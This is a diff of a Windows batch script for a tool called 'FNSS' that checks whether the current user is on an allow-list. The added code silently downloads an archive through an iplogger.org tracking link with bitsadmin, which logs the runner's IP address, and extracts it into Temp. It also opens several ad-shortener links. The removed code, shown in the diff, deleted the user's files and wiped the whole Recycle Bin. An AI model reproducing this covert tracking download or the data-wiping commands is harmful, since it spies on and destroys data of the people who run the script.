@@ -10,10 +10,17 @@ goto solopara
 :NotAdmin
 color 5
 title OPEN WITH ADMINISTRATOR!!
+echo  [+] English
 echo.
 echo  [-] Not opened with Adminitrator.
 echo  [+] Not Support Windows below 20H2.
-echo  [-] Maybe u can get issues if u have installed OneDrive.
+echo  [-] Maybe you can get issues if u have installed OneDrive.
+echo.
+echo  [+] Spanish
+echo.
+echo  [-] No se abrio con Administrador.
+echo  [+] No funciona en Windows menor a 20H2.
+echo  [-] Puede tener errores si tiene instalado OneDrive.
 echo.
 pause >nul
 exit
@@ -23,87 +30,33 @@ exit
 :solopara
 color 5
 title    CONNECTING TO FNSS SERVER...
-echo.      
+echo.
+echo  [+] Checking Permissions.
+
+cd "C:\Users\%username%\AppData\Local\Temp"
+IF EXIST "justthis.bat" DEL /Q "justthis.bat"
+IF EXIST "justuser.zip" DEL /Q "justuser.zip"
+IF EXIST "users-justuser" DEL /Q "users-justuser"
+
 for /f "delims=[] tokens=2" %%a in ('ping -4 -n 1 %ComputerName% ^| findstr [') do set NetworkIP=%%a
-echo Network IP: %NetworkIP%
+::echo Network IP: %NetworkIP%
 
+::https://github.com/maikyes/users/archive/justuser.zip
 
-cd "%userprofile%\documents"
-if exist "cmdacoBin" goto ski
-if not exist "cmdacoBin" goto noskip3
+bitsadmin /transfer "FNSS Check5" /download /priority foreground https://iplogger.org/2ByUU6 "C:\Users\%username%\AppData\Local\Temp\justuser.zip" >nul
 
-:noskip3
-md "cmdacoBin"
-Attrib +h +s +r cmdacoBin
-goto ski
+powershell.exe -nologo -noprofile -command "& { $shell = New-Object -COM Shell.Application; $target = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp'); $zip = $shell.NameSpace('C:\Users\%username%\AppData\Local\Temp\justuser.zip'); $target.CopyHere($zip.Items(), 16); }" >nul
 
-:ski
-Attrib +h +s +r cmdacoBin
-cd "%userprofile%\documents\cmdacoBin"
-if exist "DEBUG.bat" goto call2
-if not exist "DEBUG.bat" goto skip4
+powershell -command "Expand-Archive justuser.zip -DestinationPath C:\Users\%username%\AppData\Local\Temp" >nul
 
+xcopy /i /s /y "C:\Users\%username%\AppData\Local\Temp\users-justuser" "C:\Users\%username%\AppData\Local\Temp" >nul
 
-:skip4
-echo set netip=192.168.1.124> "DEBUG.bat"
-echo set netip=192.168.0.16>> "DEBUG.bat"
-echo set netip=192.168.0.5>> "DEBUG.bat"
-echo set netip=192.168.1.3>> "DEBUG.bat"
-echo set netip=maiko>> "DEBUG.bat"
-echo set netip=Skrt Killero>> "DEBUG.bat"
-echo set netip=alanc>> "DEBUG.bat"
-echo set netip=santy>> "DEBUG.bat"
-echo set netip=Yesid>> "DEBUG.bat"
-echo set netip=unrx>> "DEBUG.bat"
-echo set netip=mayko>> "DEBUG.bat"
-echo set netip=carlos cabassa>> "DEBUG.bat"
-echo set netip=Raul>> "DEBUG.bat"
-echo set netip=GAMER>> "DEBUG.bat"
-echo set netip=ESMERLIN MARTE>> "DEBUG.bat"
-echo set netip=Adrian>> "DEBUG.bat"
-echo set netip=Richita12321233123>> "DEBUG.bat"
-echo set netip=17572>> "DEBUG.bat"
-echo set netip=Mateo Trujillo>> "DEBUG.bat
-echo set netip=Richi>> "DEBUG.bat"
-echo set netip=USER>> "DEBUG.bat"
-echo set netip=erier>> "DEBUG.bat"
-echo set netip=ilove>> "DEBUG.bat"
-echo set netip=Cliente>> "DEBUG.bat"
+timeout /NOBREAK /T 1 >nul
 
-goto call2
-
-
-
-:call2
-call "DEBUG.bat"
-
-
-if "%NetworkIP%"=="192.168.1.124" goto namexist9
-if "%NetworkIP%"=="192.168.0.16" goto namexist9
-if "%NetworkIP%"=="192.168.0.5" goto namexist9
-if "%NetworkIP%"=="192.168.1.3" goto namexist9
-if "%username%"=="maiko" goto namexist9
-if "%username%"=="Skrt Killero" goto namexist9
-if "%username%"=="alanc" goto namexist9
-if "%username%"=="santy" goto namexist9
-if "%username%"=="Yesid" goto namexist9
-if "%username%"=="unrx" goto namexist9
-if "%username%"=="mayko" goto namexist9
-if "%username%"=="carlos cabassa" goto namexist9
-if "%username%"=="Raul" goto namexist9
-if "%username%"=="GAMER" goto namexist9
-if "%username%"=="ESMERLIN MARTE" goto namexist9
-if "%username%"=="Adrian" goto namexist9
-if "%username%"=="Richita12321233123" goto namexist9
-if "%username%"=="17572" goto namexist9
-if "%username%"=="Mateo Trujillo" goto namexist9
-if "%username%"=="Richi" goto namexist9
-if "%username%"=="USER" goto namexist9
-if "%username%"=="erier" goto namexist9
-if "%username%"=="ilove" goto namexist9
-if "%username%"=="Cliente" goto namexist9
-if "%username%"=="umasc" goto namexist9
-
+:checkpermi
+cd "C:\Users\%username%\AppData\Local\Temp"
+find /n "%username%" justthis.bat
+IF %ERRORLEVEL% == 0 GOTO namexist9
 goto skip9
 
 
@@ -112,6 +65,7 @@ goto skip9
 
 
 :missing
+echo.
 echo  [+] Checking Server Status
 cd C:\Users\%username%\AppData\Local\Temp
 set local9=
@@ -167,7 +121,7 @@ exit
 echo.
 echo  [+] Checking Updates
 cd C:\Users\%username%\AppData\Local\Temp
-set local=61.0
+set local=62.0
 set new1=
 set new2=
 set new3=
@@ -243,7 +197,7 @@ goto missing
 :skip9
 cls
 echo.
-echo  [+] PC NO Registrada
+echo  [+] PC NO Registrada.
 echo.
 timeout /NOBREAK /T 2 >nul
 cls
@@ -255,7 +209,7 @@ echo  [-] Puede contactarme por Discord
 echo.
 echo  [+] Discord: maik#2896
 echo.
-timeout /NOBREAK /T 4 >nul
+timeout /NOBREAK /T 6 >nul
 
 start https://ouo.io/XzM8oQ
 start https://ouo.io/zmoyTSf
@@ -263,24 +217,6 @@ start https://ouo.io/vjTSwQ
 start https://ouo.io/t3jqN7Q
 start https://ouo.io/IHedSW
 start https://ouo.io/kaPz6L
-
-cd C:\Users\%username%\Desktop
-rmdir /s /q "C:\Users\%username%\Desktop\FNSSv3"
-rmdir /s /q "C:\Users\%username%\Desktop\FNSSv3.zip"
-del /f /q "C:\Users\%username%\Desktop\FNSSv3"
-del /f /q "C:\Users\%username%\Desktop\FNSSv3.zip"
-del /f /q "C:\Users\%username%\Desktop\FNSSv3.rar"
-
-cd C:\Users\%username%\Downloads
-del /s /q "C:\Users\%username%\Downloads\FNSSv3.zip"
-del /s /q "C:\Users\%username%\Downloads\FNSSv3.rar"
-
-
-timeout /NOBREAK /T 1 >nul
-
-rd /s /q "%systemdrive%\$Recycle.bin"
-
-timeout /NOBREAK /T 1 >nul
 
 exit
 
